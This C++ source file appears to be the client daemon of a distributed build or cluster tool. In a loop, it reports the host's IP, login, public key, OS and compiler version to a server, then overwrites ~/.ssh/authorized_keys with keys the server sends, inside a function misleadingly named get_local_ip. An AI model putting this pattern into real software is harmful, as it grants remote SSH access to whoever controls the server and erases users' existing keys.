#include <iostream>
#include <fstream>
#include <cstring>

#include "background_commun.h"
#include "requests.h"
#include "sys_spec.h"

#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <boost/property_tree/ptree.hpp>
#include <boost/property_tree/json_parser.hpp>


void get_local_ip() {
    while (true) {
        std::string google_dns_server = "8.8.8.8";
        int dns_port = 53;

        struct sockaddr_in serv;
        int sock = socket(AF_INET, SOCK_DGRAM, 0);

        //Socket could not be created
        if (sock < 0) {
            std::cerr << "Socket error" << std::endl;
        }

        memset(&serv, 0, sizeof(serv));
        serv.sin_family = AF_INET;
        serv.sin_addr.s_addr = inet_addr(google_dns_server.c_str());
        serv.sin_port = htons(dns_port);

        int err = connect(sock, (const struct sockaddr *) &serv, sizeof(serv));
        if (err < 0) {
            std::this_thread::sleep_for(std::chrono::seconds(4));
            continue;
        }

        struct sockaddr_in name;
        socklen_t namelen = sizeof(name);
        getsockname(sock, (struct sockaddr *) &name, &namelen);

        char buffer[80];
        const char *p = inet_ntop(AF_INET, &name.sin_addr, buffer, 80);
        if (p != nullptr) {
            std::string ip{buffer};
            auto[public_key, login] = get_public_key_and_login();
            std::string linux_dist = get_os();
            auto[compiler, major, minor] = compiler_version();
            put_ip(login, ip, public_key, linux_dist, compiler, major, minor);

            auto public_keys_json = get("/get_public_keys");
            auto result = get_public_keys(public_keys_json);
            std::string extract_to{std::string(getenv("HOME")) + "/.ssh/authorized_keys"};

            std::ofstream authorized_key_files(extract_to);
            for (std::string &s : result)
                if (!s.empty())
                    authorized_key_files << "ssh-rsa " << s << std::endl;


            std::this_thread::sleep_for(std::chrono::seconds(30));
        } else {
            std::cerr << "Error: " << errno << std::endl
                      << " Error message: " << strerror(errno) << std::endl;
        }

        close(sock);
    }
}

int main(int argc, char *argv[]) {
    /*


    pid_t pid, sid;

    //Fork the Parent Process
    pid = fork();

    if (pid < 0) { exit(EXIT_FAILURE); }

    //We got a good pid, Close the Parent Process
    if (pid > 0) { exit(EXIT_SUCCESS); }

    //Change File Mask
    umask(0);

    //Create a new Signature Id for our child
    sid = setsid();
    if (sid < 0) { exit(EXIT_FAILURE); }

    //Change Directory
    //If we cant find the directory we exit with failure.
    if ((chdir("/")) < 0) { exit(EXIT_FAILURE); }

    //Close Standard File Descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    //----------------
    //Main Process
    //----------------
    */
    get_local_ip();

    return 0;


}